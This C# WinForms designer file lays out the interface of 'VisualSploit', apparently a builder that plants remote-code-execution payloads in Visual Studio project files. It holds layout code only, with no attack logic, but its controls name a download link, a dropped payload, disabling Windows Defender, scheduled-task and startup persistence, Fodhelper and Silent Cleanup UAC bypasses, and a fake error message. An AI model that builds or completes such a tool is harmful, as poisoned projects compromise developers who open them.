using System;

namespace VisualSploit
{
    partial class Form1
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.txtPath = new System.Windows.Forms.TextBox();
            this.txtLink = new System.Windows.Forms.TextBox();
            this.metroTabControl1 = new MetroFramework.Controls.MetroTabControl();
            this.metroTabControl2 = new MetroFramework.Controls.MetroTabControl();
            this.metroTabPage1 = new MetroFramework.Controls.MetroTabPage();
            this.txtStartupName = new System.Windows.Forms.TextBox();
            this.btnTestError = new MetroFramework.Controls.MetroButton();
            this.txtDescription = new System.Windows.Forms.TextBox();
            this.txtTitle = new System.Windows.Forms.TextBox();
            this.boxErrorMsg = new System.Windows.Forms.CheckBox();
            this.label5 = new System.Windows.Forms.Label();
            this.radioFodhelper = new System.Windows.Forms.RadioButton();
            this.radioSilentCleanup = new System.Windows.Forms.RadioButton();
            this.label3 = new System.Windows.Forms.Label();
            this.txtMinutes = new System.Windows.Forms.TextBox();
            this.boxTaskScheduler = new System.Windows.Forms.CheckBox();
            this.boxStartup = new System.Windows.Forms.CheckBox();
            this.cboPath = new MetroFramework.Controls.MetroComboBox();
            this.label4 = new System.Windows.Forms.Label();
            this.txtFileName = new System.Windows.Forms.TextBox();
            this.disableWD = new System.Windows.Forms.CheckBox();
            this.richTextBox4 = new System.Windows.Forms.RichTextBox();
            this.btnBrowseFiles = new MetroFramework.Controls.MetroButton();
            this.PayloadOptions = new System.Windows.Forms.Label();
            this.richTextBox3 = new System.Windows.Forms.RichTextBox();
            this.lblPath = new System.Windows.Forms.Label();
            this.richTextBox2 = new System.Windows.Forms.RichTextBox();
            this.richTextBox1 = new System.Windows.Forms.RichTextBox();
            this.metroTabPage2 = new MetroFramework.Controls.MetroTabPage();
            this.panel1 = new System.Windows.Forms.Panel();
            this.rtbLogs = new System.Windows.Forms.RichTextBox();
            this.btnBuild = new MetroFramework.Controls.MetroButton();
            this.panel2 = new System.Windows.Forms.Panel();
            this.agreeTOS = new System.Windows.Forms.CheckBox();
            this.panelTop = new System.Windows.Forms.Panel();
            this.lblTitle1 = new System.Windows.Forms.Label();
            this.button1 = new System.Windows.Forms.Button();
            this.metroTabControl2.SuspendLayout();
            this.metroTabPage1.SuspendLayout();
            this.metroTabPage2.SuspendLayout();
            this.panel1.SuspendLayout();
            this.panel2.SuspendLayout();
            this.panelTop.SuspendLayout();
            this.SuspendLayout();
            // 
            // txtPath
            // 
            this.txtPath.AllowDrop = true;
            this.txtPath.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Italic);
            this.txtPath.ForeColor = System.Drawing.SystemColors.ControlText;
            this.txtPath.Location = new System.Drawing.Point(67, 140);
            this.txtPath.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.txtPath.Name = "txtPath";
            this.txtPath.Size = new System.Drawing.Size(479, 27);
            this.txtPath.TabIndex = 1;
            this.txtPath.Text = "Path to VB/CSProj File...";
            this.txtPath.DragDrop += new System.Windows.Forms.DragEventHandler(this.txtPath_DragDrop);
            this.txtPath.DragEnter += new System.Windows.Forms.DragEventHandler(this.txtPath_DragEnter);
            // 
            // txtLink
            // 
            this.txtLink.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Italic);
            this.txtLink.ForeColor = System.Drawing.SystemColors.ControlText;
            this.txtLink.Location = new System.Drawing.Point(67, 90);
            this.txtLink.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.txtLink.Name = "txtLink";
            this.txtLink.Size = new System.Drawing.Size(612, 27);
            this.txtLink.TabIndex = 4;
            this.txtLink.Text = "Direct Download Link...";
            this.txtLink.TextChanged += new System.EventHandler(this.txtLink_TextChanged);
            // 
            // metroTabControl1
            // 
            this.metroTabControl1.Location = new System.Drawing.Point(0, 0);
            this.metroTabControl1.Name = "metroTabControl1";
            this.metroTabControl1.Size = new System.Drawing.Size(200, 100);
            this.metroTabControl1.TabIndex = 0;
            this.metroTabControl1.UseSelectable = true;
            // 
            // metroTabControl2
            // 
            this.metroTabControl2.Controls.Add(this.metroTabPage1);
            this.metroTabControl2.Controls.Add(this.metroTabPage2);
            this.metroTabControl2.Location = new System.Drawing.Point(0, 52);
            this.metroTabControl2.Name = "metroTabControl2";
            this.metroTabControl2.SelectedIndex = 0;
            this.metroTabControl2.Size = new System.Drawing.Size(756, 555);
            this.metroTabControl2.Style = MetroFramework.MetroColorStyle.Black;
            this.metroTabControl2.TabIndex = 14;
            this.metroTabControl2.UseSelectable = true;
            this.metroTabControl2.UseStyleColors = true;
            // 
            // metroTabPage1
            // 
            this.metroTabPage1.Controls.Add(this.txtStartupName);
            this.metroTabPage1.Controls.Add(this.btnTestError);
            this.metroTabPage1.Controls.Add(this.txtDescription);
            this.metroTabPage1.Controls.Add(this.txtTitle);
            this.metroTabPage1.Controls.Add(this.boxErrorMsg);
            this.metroTabPage1.Controls.Add(this.label5);
            this.metroTabPage1.Controls.Add(this.radioFodhelper);
            this.metroTabPage1.Controls.Add(this.radioSilentCleanup);
            this.metroTabPage1.Controls.Add(this.label3);
            this.metroTabPage1.Controls.Add(this.txtMinutes);
            this.metroTabPage1.Controls.Add(this.boxTaskScheduler);
            this.metroTabPage1.Controls.Add(this.boxStartup);
            this.metroTabPage1.Controls.Add(this.cboPath);
            this.metroTabPage1.Controls.Add(this.label4);
            this.metroTabPage1.Controls.Add(this.txtFileName);
            this.metroTabPage1.Controls.Add(this.disableWD);
            this.metroTabPage1.Controls.Add(this.richTextBox4);
            this.metroTabPage1.Controls.Add(this.btnBrowseFiles);
            this.metroTabPage1.Controls.Add(this.txtPath);
            this.metroTabPage1.Controls.Add(this.txtLink);
            this.metroTabPage1.Controls.Add(this.PayloadOptions);
            this.metroTabPage1.Controls.Add(this.richTextBox3);
            this.metroTabPage1.Controls.Add(this.lblPath);
            this.metroTabPage1.Controls.Add(this.richTextBox2);
            this.metroTabPage1.Controls.Add(this.richTextBox1);
            this.metroTabPage1.Font = new System.Drawing.Font("Century Gothic", 9F);
            this.metroTabPage1.HorizontalScrollbarBarColor = true;
            this.metroTabPage1.HorizontalScrollbarHighlightOnWheel = false;
            this.metroTabPage1.HorizontalScrollbarSize = 10;
            this.metroTabPage1.Location = new System.Drawing.Point(4, 38);
            this.metroTabPage1.Name = "metroTabPage1";
            this.metroTabPage1.Size = new System.Drawing.Size(748, 513);
            this.metroTabPage1.TabIndex = 0;
            this.metroTabPage1.Text = "Home";
            this.metroTabPage1.VerticalScrollbarBarColor = true;
            this.metroTabPage1.VerticalScrollbarHighlightOnWheel = false;
            this.metroTabPage1.VerticalScrollbarSize = 10;
            this.metroTabPage1.Click += new System.EventHandler(this.metroTabPage1_Click);
            // 
            // txtStartupName
            // 
            this.txtStartupName.Enabled = false;
            this.txtStartupName.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Italic);
            this.txtStartupName.ForeColor = System.Drawing.SystemColors.ControlText;
            this.txtStartupName.Location = new System.Drawing.Point(203, 345);
            this.txtStartupName.Name = "txtStartupName";
            this.txtStartupName.Size = new System.Drawing.Size(93, 27);
            this.txtStartupName.TabIndex = 45;
            this.txtStartupName.Text = "Update.exe";
            // 
            // btnTestError
            // 
            this.btnTestError.Enabled = false;
            this.btnTestError.FontSize = MetroFramework.MetroButtonSize.Tall;
            this.btnTestError.FontWeight = MetroFramework.MetroButtonWeight.Light;
            this.btnTestError.Location = new System.Drawing.Point(456, 405);
            this.btnTestError.Name = "btnTestError";
            this.btnTestError.Size = new System.Drawing.Size(163, 41);
            this.btnTestError.Style = MetroFramework.MetroColorStyle.Black;
            this.btnTestError.TabIndex = 44;
            this.btnTestError.Text = "Test Error Message";
            this.btnTestError.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.btnTestError.UseSelectable = true;
            this.btnTestError.Click += new System.EventHandler(this.btnTestError_Click);
            // 
            // txtDescription
            // 
            this.txtDescription.Enabled = false;
            this.txtDescription.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Italic);
            this.txtDescription.ForeColor = System.Drawing.SystemColors.ControlText;
            this.txtDescription.Location = new System.Drawing.Point(383, 355);
            this.txtDescription.Name = "txtDescription";
            this.txtDescription.Size = new System.Drawing.Size(307, 27);
            this.txtDescription.TabIndex = 43;
            this.txtDescription.Text = "Error Message Description";
            // 
            // txtTitle
            // 
            this.txtTitle.Enabled = false;
            this.txtTitle.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Italic);
            this.txtTitle.ForeColor = System.Drawing.SystemColors.ControlText;
            this.txtTitle.Location = new System.Drawing.Point(383, 322);
            this.txtTitle.Name = "txtTitle";
            this.txtTitle.Size = new System.Drawing.Size(307, 27);
            this.txtTitle.TabIndex = 42;
            this.txtTitle.Text = "Error Message Title";
            // 
            // boxErrorMsg
            // 
            this.boxErrorMsg.AutoSize = true;
            this.boxErrorMsg.BackColor = System.Drawing.SystemColors.ControlDarkDark;
            this.boxErrorMsg.ForeColor = System.Drawing.SystemColors.ControlLightLight;
            this.boxErrorMsg.Location = new System.Drawing.Point(383, 291);
            this.boxErrorMsg.Name = "boxErrorMsg";
            this.boxErrorMsg.Size = new System.Drawing.Size(174, 24);
            this.boxErrorMsg.TabIndex = 41;
            this.boxErrorMsg.Text = "Fake Error Message";
            this.boxErrorMsg.UseVisualStyleBackColor = false;
            this.boxErrorMsg.CheckedChanged += new System.EventHandler(this.checkBox1_CheckedChanged);
            // 
            // label5
            // 
            this.label5.AutoSize = true;
            this.label5.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.label5.Font = new System.Drawing.Font("Century Gothic", 11F);
            this.label5.ForeColor = System.Drawing.SystemColors.ControlLightLight;
            this.label5.Location = new System.Drawing.Point(359, 246);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(143, 22);
            this.label5.TabIndex = 40;
            this.label5.Text = "Customization:";
            // 
            // radioFodhelper
            // 
            this.radioFodhelper.AutoSize = true;
            this.radioFodhelper.BackColor = System.Drawing.SystemColors.ControlDarkDark;
            this.radioFodhelper.Enabled = false;
            this.radioFodhelper.ForeColor = System.Drawing.SystemColors.ControlLightLight;
            this.radioFodhelper.Location = new System.Drawing.Point(81, 435);
            this.radioFodhelper.Name = "radioFodhelper";
            this.radioFodhelper.Size = new System.Drawing.Size(104, 24);
            this.radioFodhelper.TabIndex = 39;
            this.radioFodhelper.TabStop = true;
            this.radioFodhelper.Text = "Fodhelper";
            this.radioFodhelper.UseVisualStyleBackColor = false;
            // 
            // radioSilentCleanup
            // 
            this.radioSilentCleanup.AutoSize = true;
            this.radioSilentCleanup.BackColor = System.Drawing.SystemColors.ControlDarkDark;
            this.radioSilentCleanup.Enabled = false;
            this.radioSilentCleanup.ForeColor = System.Drawing.SystemColors.ControlLightLight;
            this.radioSilentCleanup.Location = new System.Drawing.Point(81, 405);
            this.radioSilentCleanup.Name = "radioSilentCleanup";
            this.radioSilentCleanup.Size = new System.Drawing.Size(134, 24);
            this.radioSilentCleanup.TabIndex = 38;
            this.radioSilentCleanup.TabStop = true;
            this.radioSilentCleanup.Text = "Silent Cleanup";
            this.radioSilentCleanup.UseVisualStyleBackColor = false;
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.BackColor = System.Drawing.Color.DimGray;
            this.label3.Font = new System.Drawing.Font("Century Gothic", 9F);
            this.label3.ForeColor = System.Drawing.SystemColors.ControlLightLight;
            this.label3.Location = new System.Drawing.Point(71, 318);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(70, 20);
            this.label3.TabIndex = 37;
            this.label3.Text = "Minutes:";
            // 
            // txtMinutes
            // 
            this.txtMinutes.Enabled = false;
            this.txtMinutes.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Italic);
            this.txtMinutes.ForeColor = System.Drawing.SystemColors.ControlText;
            this.txtMinutes.Location = new System.Drawing.Point(135, 315);
            this.txtMinutes.Name = "txtMinutes";
            this.txtMinutes.Size = new System.Drawing.Size(50, 27);
            this.txtMinutes.TabIndex = 36;
            this.txtMinutes.Text = "10";
            // 
            // boxTaskScheduler
            // 
            this.boxTaskScheduler.AutoSize = true;
            this.boxTaskScheduler.BackColor = System.Drawing.SystemColors.ControlDarkDark;
            this.boxTaskScheduler.ForeColor = System.Drawing.SystemColors.ControlLightLight;
            this.boxTaskScheduler.Location = new System.Drawing.Point(53, 291);
            this.boxTaskScheduler.Name = "boxTaskScheduler";
            this.boxTaskScheduler.Size = new System.Drawing.Size(179, 24);
            this.boxTaskScheduler.TabIndex = 35;
            this.boxTaskScheduler.Text = "Schtasks Persistence";
            this.boxTaskScheduler.UseVisualStyleBackColor = false;
            this.boxTaskScheduler.CheckedChanged += new System.EventHandler(this.boxTaskScheduler_CheckedChanged);
            // 
            // boxStartup
            // 
            this.boxStartup.AutoSize = true;
            this.boxStartup.BackColor = System.Drawing.SystemColors.ControlDarkDark;
            this.boxStartup.ForeColor = System.Drawing.SystemColors.ControlLightLight;
            this.boxStartup.Location = new System.Drawing.Point(53, 345);
            this.boxStartup.Name = "boxStartup";
            this.boxStartup.Size = new System.Drawing.Size(169, 24);
            this.boxStartup.TabIndex = 34;
            this.boxStartup.Text = "Startup Persistence";
            this.boxStartup.UseVisualStyleBackColor = false;
            this.boxStartup.CheckedChanged += new System.EventHandler(this.boxStartup_CheckedChanged);
            // 
            // cboPath
            // 
            this.cboPath.FormattingEnabled = true;
            this.cboPath.ItemHeight = 24;
            this.cboPath.Items.AddRange(new object[] {
            "%Temp%",
            "%AppData%",
            "%ProgramData%",
            "%ProgramFiles%",
            "%SystemRoot%"});
            this.cboPath.Location = new System.Drawing.Point(569, 184);
            this.cboPath.Name = "cboPath";
            this.cboPath.Size = new System.Drawing.Size(110, 30);
            this.cboPath.TabIndex = 33;
            this.cboPath.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.cboPath.UseSelectable = true;
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.BackColor = System.Drawing.Color.DimGray;
            this.label4.Font = new System.Drawing.Font("Century Gothic", 10F);
            this.label4.ForeColor = System.Drawing.SystemColors.ControlLightLight;
            this.label4.Location = new System.Drawing.Point(65, 189);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(164, 21);
            this.label4.TabIndex = 32;
            this.label4.Text = "Dropped Payload:";
            // 
            // txtFileName
            // 
            this.txtFileName.AllowDrop = true;
            this.txtFileName.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Italic);
            this.txtFileName.ForeColor = System.Drawing.SystemColors.ControlText;
            this.txtFileName.Location = new System.Drawing.Point(203, 187);
            this.txtFileName.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.txtFileName.Name = "txtFileName";
            this.txtFileName.Size = new System.Drawing.Size(343, 27);
            this.txtFileName.TabIndex = 31;
            this.txtFileName.Text = "DroppedPayload.exe";
            this.txtFileName.TextChanged += new System.EventHandler(this.txtFileName_TextChanged);
            // 
            // disableWD
            // 
            this.disableWD.AutoSize = true;
            this.disableWD.BackColor = System.Drawing.SystemColors.ControlDarkDark;
            this.disableWD.ForeColor = System.Drawing.SystemColors.ControlLightLight;
            this.disableWD.Location = new System.Drawing.Point(53, 375);
            this.disableWD.Name = "disableWD";
            this.disableWD.Size = new System.Drawing.Size(229, 24);
            this.disableWD.TabIndex = 30;
            this.disableWD.Text = "Disable Windows Defender";
            this.disableWD.UseVisualStyleBackColor = false;
            this.disableWD.CheckedChanged += new System.EventHandler(this.disableWD_CheckedChanged);
            // 
            // richTextBox4
            // 
            this.richTextBox4.BackColor = System.Drawing.Color.DimGray;
            this.richTextBox4.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.richTextBox4.Font = new System.Drawing.Font("Century Gothic", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.richTextBox4.ForeColor = System.Drawing.SystemColors.WindowText;
            this.richTextBox4.Location = new System.Drawing.Point(363, 278);
            this.richTextBox4.Name = "richTextBox4";
            this.richTextBox4.ReadOnly = true;
            this.richTextBox4.Size = new System.Drawing.Size(347, 195);
            this.richTextBox4.TabIndex = 20;
            this.richTextBox4.Text = "";
            // 
            // btnBrowseFiles
            // 
            this.btnBrowseFiles.FontSize = MetroFramework.MetroButtonSize.Medium;
            this.btnBrowseFiles.FontWeight = MetroFramework.MetroButtonWeight.Light;
            this.btnBrowseFiles.Location = new System.Drawing.Point(569, 132);
            this.btnBrowseFiles.Name = "btnBrowseFiles";
            this.btnBrowseFiles.Size = new System.Drawing.Size(110, 35);
            this.btnBrowseFiles.TabIndex = 14;
            this.btnBrowseFiles.Text = "Browse";
            this.btnBrowseFiles.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.btnBrowseFiles.UseSelectable = true;
            this.btnBrowseFiles.Click += new System.EventHandler(this.btnBrowseFiles_Click);
            // 
            // PayloadOptions
            // 
            this.PayloadOptions.AutoSize = true;
            this.PayloadOptions.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.PayloadOptions.Font = new System.Drawing.Font("Century Gothic", 11F);
            this.PayloadOptions.ForeColor = System.Drawing.SystemColors.ControlLightLight;
            this.PayloadOptions.Location = new System.Drawing.Point(34, 41);
            this.PayloadOptions.Name = "PayloadOptions";
            this.PayloadOptions.Size = new System.Drawing.Size(167, 22);
            this.PayloadOptions.TabIndex = 18;
            this.PayloadOptions.Text = "Payload Options:";
            // 
            // richTextBox3
            // 
            this.richTextBox3.BackColor = System.Drawing.Color.DimGray;
            this.richTextBox3.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.richTextBox3.Font = new System.Drawing.Font("Century Gothic", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.richTextBox3.ForeColor = System.Drawing.SystemColors.WindowText;
            this.richTextBox3.Location = new System.Drawing.Point(38, 74);
            this.richTextBox3.Name = "richTextBox3";
            this.richTextBox3.ReadOnly = true;
            this.richTextBox3.Size = new System.Drawing.Size(672, 156);
            this.richTextBox3.TabIndex = 19;
            this.richTextBox3.Text = "";
            this.richTextBox3.TextChanged += new System.EventHandler(this.richTextBox3_TextChanged);
            // 
            // lblPath
            // 
            this.lblPath.AutoSize = true;
            this.lblPath.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.lblPath.Font = new System.Drawing.Font("Century Gothic", 11F);
            this.lblPath.ForeColor = System.Drawing.SystemColors.ControlLightLight;
            this.lblPath.Location = new System.Drawing.Point(34, 246);
            this.lblPath.Name = "lblPath";
            this.lblPath.Size = new System.Drawing.Size(239, 22);
            this.lblPath.TabIndex = 16;
            this.lblPath.Text = "AV Evasion / Persistence:";
            // 
            // richTextBox2
            // 
            this.richTextBox2.BackColor = System.Drawing.Color.DimGray;
            this.richTextBox2.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.richTextBox2.Font = new System.Drawing.Font("Century Gothic", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.richTextBox2.ForeColor = System.Drawing.SystemColors.WindowText;
            this.richTextBox2.Location = new System.Drawing.Point(38, 278);
            this.richTextBox2.Name = "richTextBox2";
            this.richTextBox2.ReadOnly = true;
            this.richTextBox2.Size = new System.Drawing.Size(293, 195);
            this.richTextBox2.TabIndex = 17;
            this.richTextBox2.Text = "";
            // 
            // richTextBox1
            // 
            this.richTextBox1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.richTextBox1.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.richTextBox1.Font = new System.Drawing.Font("Century Gothic", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.richTextBox1.Location = new System.Drawing.Point(14, 18);
            this.richTextBox1.Name = "richTextBox1";
            this.richTextBox1.ReadOnly = true;
            this.richTextBox1.Size = new System.Drawing.Size(719, 481);
            this.richTextBox1.TabIndex = 15;
            this.richTextBox1.Text = "";
            this.richTextBox1.TextChanged += new System.EventHandler(this.richTextBox1_TextChanged);
            // 
            // metroTabPage2
            // 
            this.metroTabPage2.Controls.Add(this.panel1);
            this.metroTabPage2.Controls.Add(this.btnBuild);
            this.metroTabPage2.Controls.Add(this.panel2);
            this.metroTabPage2.HorizontalScrollbarBarColor = true;
            this.metroTabPage2.HorizontalScrollbarHighlightOnWheel = false;
            this.metroTabPage2.HorizontalScrollbarSize = 10;
            this.metroTabPage2.Location = new System.Drawing.Point(4, 38);
            this.metroTabPage2.Name = "metroTabPage2";
            this.metroTabPage2.Size = new System.Drawing.Size(748, 513);
            this.metroTabPage2.TabIndex = 1;
            this.metroTabPage2.Text = "Build Exploit";
            this.metroTabPage2.VerticalScrollbarBarColor = true;
            this.metroTabPage2.VerticalScrollbarHighlightOnWheel = false;
            this.metroTabPage2.VerticalScrollbarSize = 10;
            this.metroTabPage2.Click += new System.EventHandler(this.metroTabPage2_Click);
            // 
            // panel1
            // 
            this.panel1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.panel1.Controls.Add(this.rtbLogs);
            this.panel1.Location = new System.Drawing.Point(14, 79);
            this.panel1.Name = "panel1";
            this.panel1.Size = new System.Drawing.Size(719, 420);
            this.panel1.TabIndex = 7;
            // 
            // rtbLogs
            // 
            this.rtbLogs.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.rtbLogs.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.rtbLogs.DetectUrls = false;
            this.rtbLogs.Font = new System.Drawing.Font("Segoe UI Semilight", 10.2F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.rtbLogs.ForeColor = System.Drawing.SystemColors.ControlLightLight;
            this.rtbLogs.Location = new System.Drawing.Point(15, 15);
            this.rtbLogs.Name = "rtbLogs";
            this.rtbLogs.ReadOnly = true;
            this.rtbLogs.Size = new System.Drawing.Size(689, 389);
            this.rtbLogs.TabIndex = 0;
            this.rtbLogs.Text = "";
            this.rtbLogs.TextChanged += new System.EventHandler(this.rtbLogs_TextChanged);
            // 
            // btnBuild
            // 
            this.btnBuild.Enabled = false;
            this.btnBuild.FontSize = MetroFramework.MetroButtonSize.Tall;
            this.btnBuild.FontWeight = MetroFramework.MetroButtonWeight.Light;
            this.btnBuild.Location = new System.Drawing.Point(524, 18);
            this.btnBuild.Name = "btnBuild";
            this.btnBuild.Size = new System.Drawing.Size(209, 42);
            this.btnBuild.TabIndex = 6;
            this.btnBuild.Text = "Build";
            this.btnBuild.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.btnBuild.UseSelectable = true;
            this.btnBuild.Click += new System.EventHandler(this.btnBuild_Click);
            // 
            // panel2
            // 
            this.panel2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.panel2.Controls.Add(this.agreeTOS);
            this.panel2.Location = new System.Drawing.Point(14, 18);
            this.panel2.Name = "panel2";
            this.panel2.Size = new System.Drawing.Size(490, 42);
            this.panel2.TabIndex = 8;
            // 
            // agreeTOS
            // 
            this.agreeTOS.AutoSize = true;
            this.agreeTOS.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.agreeTOS.Font = new System.Drawing.Font("Century Gothic", 10F);
            this.agreeTOS.ForeColor = System.Drawing.SystemColors.ControlLightLight;
            this.agreeTOS.Location = new System.Drawing.Point(15, 12);
            this.agreeTOS.Name = "agreeTOS";
            this.agreeTOS.Size = new System.Drawing.Size(505, 25);
            this.agreeTOS.TabIndex = 0;
            this.agreeTOS.Text = "I agree to only use VisualSploit in agreement with the law.";
            this.agreeTOS.UseVisualStyleBackColor = true;
            this.agreeTOS.CheckedChanged += new System.EventHandler(this.agreeTOS_CheckedChanged);
            // 
            // panelTop
            // 
            this.panelTop.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.panelTop.Controls.Add(this.lblTitle1);
            this.panelTop.Controls.Add(this.button1);
            this.panelTop.Location = new System.Drawing.Point(0, 0);
            this.panelTop.Name = "panelTop";
            this.panelTop.Size = new System.Drawing.Size(762, 53);
            this.panelTop.TabIndex = 15;
            this.panelTop.Paint += new System.Windows.Forms.PaintEventHandler(this.panelTop_Paint);
            this.panelTop.MouseMove += new System.Windows.Forms.MouseEventHandler(this.panelTop_MouseMove);
            // 
            // lblTitle1
            // 
            this.lblTitle1.AutoSize = true;
            this.lblTitle1.Cursor = System.Windows.Forms.Cursors.Hand;
            this.lblTitle1.Font = new System.Drawing.Font("Century Gothic", 16F, System.Drawing.FontStyle.Bold);
            this.lblTitle1.ForeColor = System.Drawing.SystemColors.ControlLightLight;
            this.lblTitle1.Location = new System.Drawing.Point(12, 15);
            this.lblTitle1.Name = "lblTitle1";
            this.lblTitle1.Size = new System.Drawing.Size(647, 32);
            this.lblTitle1.TabIndex = 1;
            this.lblTitle1.Text = "VisualSploit | VS Project Remote Code Execution";
            this.lblTitle1.MouseMove += new System.Windows.Forms.MouseEventHandler(this.lblTitle1_MouseMove);
            // 
            // button1
            // 
            this.button1.FlatAppearance.BorderSize = 0;
            this.button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button1.Font = new System.Drawing.Font("Lucida Sans Unicode", 16.2F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button1.ForeColor = System.Drawing.SystemColors.ControlLightLight;
            this.button1.Location = new System.Drawing.Point(695, 0);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(61, 53);
            this.button1.TabIndex = 0;
            this.button1.Text = "X";
            this.button1.UseVisualStyleBackColor = true;
            this.button1.Click += new System.EventHandler(this.button1_Click);
            // 
            // Form1
            // 
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.None;
            this.BackColor = System.Drawing.SystemColors.Control;
            this.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
            this.ClientSize = new System.Drawing.Size(757, 608);
            this.Controls.Add(this.panelTop);
            this.Controls.Add(this.metroTabControl2);
            this.Font = new System.Drawing.Font("Segoe UI", 8F);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.Name = "Form1";
            this.Text = "VisualSploit - @Melted on HF";
            this.Load += new System.EventHandler(this.Form1_Load);
            this.metroTabControl2.ResumeLayout(false);
            this.metroTabPage1.ResumeLayout(false);
            this.metroTabPage1.PerformLayout();
            this.metroTabPage2.ResumeLayout(false);
            this.panel1.ResumeLayout(false);
            this.panel2.ResumeLayout(false);
            this.panel2.PerformLayout();
            this.panelTop.ResumeLayout(false);
            this.panelTop.PerformLayout();
            this.ResumeLayout(false);

        }


        #endregion
        private System.Windows.Forms.TextBox txtPath;
        private System.Windows.Forms.TextBox txtLink;
        private MetroFramework.Controls.MetroTabControl metroTabControl1;
        private MetroFramework.Controls.MetroTabControl metroTabControl2;
        private MetroFramework.Controls.MetroTabPage metroTabPage1;
        private System.Windows.Forms.Panel panelTop;
        private System.Windows.Forms.Button button1;
        private MetroFramework.Controls.MetroTabPage metroTabPage2;
        private System.Windows.Forms.Label lblTitle1;
        private MetroFramework.Controls.MetroButton btnBuild;
        private System.Windows.Forms.Panel panel1;
        private System.Windows.Forms.Panel panel2;
        private System.Windows.Forms.CheckBox agreeTOS;
        private MetroFramework.Controls.MetroButton btnBrowseFiles;
        private System.Windows.Forms.RichTextBox rtbLogs;
        private System.Windows.Forms.RichTextBox richTextBox1;
        private System.Windows.Forms.Label PayloadOptions;
        private System.Windows.Forms.Label lblPath;
        private System.Windows.Forms.RichTextBox richTextBox4;
        private System.Windows.Forms.RichTextBox richTextBox3;
        private System.Windows.Forms.RichTextBox richTextBox2;
        private System.Windows.Forms.CheckBox disableWD;
        private System.Windows.Forms.Label label4;
        private System.Windows.Forms.TextBox txtFileName;
        private MetroFramework.Controls.MetroComboBox cboPath;
        private System.Windows.Forms.CheckBox boxStartup;
        private System.Windows.Forms.CheckBox boxTaskScheduler;
        private System.Windows.Forms.Label label3;
        private System.Windows.Forms.TextBox txtMinutes;
        private System.Windows.Forms.RadioButton radioFodhelper;
        private System.Windows.Forms.RadioButton radioSilentCleanup;
        private System.Windows.Forms.CheckBox boxErrorMsg;
        private System.Windows.Forms.Label label5;
        private MetroFramework.Controls.MetroButton btnTestError;
        private System.Windows.Forms.TextBox txtDescription;
        private System.Windows.Forms.TextBox txtTitle;
        private System.Windows.Forms.TextBox txtStartupName;
    }
}

